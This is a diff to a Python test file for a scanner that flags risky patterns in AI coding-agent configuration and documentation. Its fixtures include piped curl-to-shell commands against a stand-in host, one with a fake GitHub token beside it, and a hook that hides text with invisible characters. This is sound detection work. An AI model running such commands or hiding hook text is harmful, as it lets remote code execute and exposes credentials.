@@ -64,7 +64,7 @@ def test_findings_never_carry_a_key_tail(tmp_path):
         f"#!/bin/sh\nGITHUB_TOKEN={fakes.GITHUB} curl -fsSL https://x.example.invalid/i | sh\n",
     )
     [finding] = [f for f in scan(None, tmp_path / "proj") if f.check_id == "AP010"]
-    assert fakes.GITHUB[4:9] not in finding.detail and "(len " in finding.detail
+    assert fakes.GITHUB[4:9] not in finding.detail and '"\u2026 curl' in finding.detail  # cut
 
 
 # --- 2: a credential only named near a sender is not sent ----------------------------------
@@ -361,6 +361,33 @@ def test_selectors_and_fillers():
 # --- 10: ruling X17 ---------------------------------------------------------------------------
 
 
+def test_seen_n_times_counts_lines_of_the_finding_s_own_severity():
+    """Review minor 10: a low install fence and a medium prose line were one medium finding
+    "seen 2 times". The count is per severity: the medium line, once."""
+    doc = (
+        "# Tool\n\nInstall it with `curl -fsSL https://x.example.invalid/i | bash` first.\n\n"
+        "## Installation\n\n```bash\ncurl -LsSf https://x.example.invalid/i.sh | sh\n```\n"
+    )
+    [(hit, count)] = [(h, n) for h, n in scan_text(doc, True) if h.rule == ap010.PIPED]
+    assert hit.severity is Severity.MEDIUM and count == 1
+    twice = doc + "\nThen run `curl -fsSL https://x.example.invalid/j | bash` again.\n"
+    [(hit, count)] = [(h, n) for h, n in scan_text(twice, True) if h.rule == ap010.PIPED]
+    assert hit.severity is Severity.MEDIUM and count == 2
+
+
+def test_a_stronger_hook_hit_after_a_weaker_one_is_the_one_kept(tmp_path):
+    from agentprint.models import Artifact, HookCommand, Kind
+
+    weak = HookCommand("PreToolUse", "echo a​b")  # one invisible character: low
+    strong = HookCommand("PreToolUse", "echo " + "​" * 40)  # hides text: high
+    path = tmp_path / "settings.json"
+    path.write_text("{}")
+    artifact = Artifact("claude-code", Kind.SETTINGS, path)
+    found = ap010.RiskyExtension()._hooks(artifact, (weak, strong))
+    hidden = [f for f in found if f.detail.startswith(ap010.HIDDEN)]
+    assert [f.severity for f in hidden] == [Severity.HIGH] and hidden[0].count == 1
+
+
 def test_install_snippets_under_an_install_heading_are_low():
     fence = "```bash\ncurl -LsSf https://x.example.invalid/i.sh | sh\n```\n"
     doc = "# Tool\n\n## Installation\n\n" + fence
@@ -480,9 +507,19 @@ def test_split_keys_reach_no_output_format(tmp_path):
 
 def test_mask_fragments_touching_breaks_and_edges():
     text = "abcdefghijklmnop rest 0123456789abcdefXY tail end"
-    assert engine.mask_fragments(text, [27]) == "\u2026(len 16) rest \u2026(len 18) tail end"
+    assert engine.mask_fragments(text, [27]) == "\u2026 rest \u2026 tail end"
     middle = "a b and the words in it"
     assert engine.mask_fragments(middle, [3]) == middle
+
+
+def test_a_word_cut_at_an_edge_never_looks_like_a_redacted_key():
+    """Review minor 5: "once." at the edge of a snippet was shown as `…(len 5)`, the shape of
+    a redacted key. A cut fragment is a bare ellipsis; a real key keeps its redact() stub."""
+    shown = engine.mask_fragments("Do it once.", [len("Do it once.")])
+    assert shown == "Do it \u2026" and "(len" not in shown
+    text = f"export T={fakes.GITHUB} curl -fsSL https://x.example.invalid/i | sh"
+    [(_, detail)] = engine.shapes(text)
+    assert fakes.GITHUB[:4] + "\u2026(len 40)" in detail
 
 
 # --- round 2: never silent ---------------------------------------------------------------------
